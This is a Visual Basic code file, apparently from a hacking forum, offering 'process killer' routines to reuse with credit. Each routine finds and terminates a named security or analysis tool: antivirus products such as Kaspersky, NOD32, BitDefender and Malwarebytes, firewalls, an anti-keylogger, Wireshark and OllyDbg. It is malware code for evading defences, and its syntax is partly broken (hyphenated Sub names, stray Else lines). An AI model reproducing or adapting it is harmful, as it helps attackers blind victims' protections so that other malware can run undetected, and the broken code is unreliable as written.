'---------------General Dee's Proccess Killers-------------
'-----------Example Usage: "Anti-Keyscrambler()"-----
'---------------Permission: To Use With Credits----------
'---------------Coded: Visual Basic 2008-------------------
'Kills Keyscrambler, Wireshark, Anubis, Malwarebytes, Kaspersky, Ollydbg, Outpost, Norman,Bit Defender, Nod32, Zone Alarm

'------------------------Keyscrambler----------------------------
Sub Anti-Keyscrambler()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "keyscrambler"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub

'------------------------Wireshark----------------------------
Sub Anti-Wireshark()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "wireshark"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub

'----------------------------Anubis--------------------------------
Sub Anti-Anubis()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "anubis"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub

'------------------------Malwarebytes----------------------------
Sub Anti-Malwarebytes()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "mbam"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub

'------------------------Kaspersky----------------------------
Sub Anti-Kaspersky()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "avp"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub

'-----------------------Ollydbg---------------------------------
Sub Anti-Ollydbg()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "ollydbg"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub

'-----------------------Outpost---------------------------------
Sub Anti-Outpost()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "outpost"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub

'-----------------------Norman------------------------------
Sub Anti-Norman()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "npfmsg"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub

'-----------------------Bit Defender------------------------------
Sub Anti-BitDefender()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "bdagent"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub

'-----------------------NOD32------------------------------
Sub Anti-NOD32()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "egui"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub

'-----------------------Zone Alarm------------------------------
Sub Anti-ZoneAlarm()
Dim generaldee As Process() = Process.GetProcesses
Dim i As Integer
For i = 0 To generaldee.Length - 1
Select Case Strings.LCase(generaldee(i).ProcessName)
Case "zlclient"
generaldee(i).Kill()
Case Else
End Select
Next
Else
End Sub
